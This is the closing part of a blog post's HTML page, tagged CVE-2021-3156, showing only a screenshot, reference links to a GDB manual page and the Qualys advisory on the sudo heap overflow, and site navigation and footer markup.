<p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" title="image-20210201155514383" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/image-20210201155514383.png" alt="image-20210201155514383"></a></p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events">https://visualgdb.com/gdbreference/commands/set_stop-on-solib-events</a></p>
<p><a href="https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
<p><a href="https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt">https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt</a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
</div>


  <footer class="post-footer">
  
    <div class="post-tags">
      
        <a href="/tags/CVE-2021-3156/" class="tag">CVE-2021-3156</a>
      
    </div>
  
</footer>


  
<nav class="post-nav">
  
    <div class="post-nav-item prev">
      <span class="post-nav-label">&larr; Prev</span>
      <a href="/DEFCON-29-CTF-Qualifier-coooinbase-and-coooinbase-kernel-Write-up.html" class="post-nav-title">
        DEFCON 29 CTF Qualifier  coooinbase and coooinbase-kernel Write-up
      </a>
    </div>
  

  
    <div class="post-nav-item next">
      <span class="post-nav-label">Next &rarr;</span>
      <a href="/RWCTF-3rd-writeup.html" class="post-nav-title">
        RWCTF-3rd JunkAV writeup
      </a>
    </div>
  
</nav>



  
</article>

        </div>
      
    </main>

    <footer class="footer">
  <div class="footer-content">
    <div class="footer-left">
      
      <span class="copyright">
        &copy; 2024 - 2026 Swing
      </span>
    </div>

    <div class="footer-right">
      
        <span class="powered">
          Powered by Hexo <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>
        </span>
      
      
        <span class="theme-info">
          Theme <a href="https://github.com/yourname/hexo-theme-Bloom" target="_blank" rel="noopener">Bloom</a>
        </span>
      
    </div>
  </div>

  
    <div class="footer-social">
      
        <a href="https://github.com/WinMin" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
        </a>
      
      
        <a href="https://twitter.com/bestswngs" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
        </a>
      
      
      
        <a href="mailto:ask@mail.exp.sh" class="social-link" aria-label="Email">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/></svg>
        </a>
      
      
        <a href="/atom.xml" class="social-link" aria-label="RSS">
          <svg viewBox="0 0 24 24" width="20" height="20"><path fill="currentColor" d="M6.18 15.64a2.18 2.18 0 0 1 2.18 2.18C8.36 19 7.38 20 6.18 20C5 20 4 19 4 17.82a2.18 2.18 0 0 1 2.18-2.18M4 4.44A15.56 15.56 0 0 1 19.56 20h-2.83A12.73 12.73 0 0 0 4 7.27V4.44m0 5.66a9.9 9.9 0 0 1 9.9 9.9h-2.83A7.07 7.07 0 0 0 4 12.93V10.1z"/></svg>
        </a>
      
    </div>
  
</footer>

  </div>

  <!-- Main Script -->

<script src="/js/main.js"></script>


<!-- Search -->


<script src="/js/search.js"></script>



<!-- Baidu Analytics -->


</body>
</html>
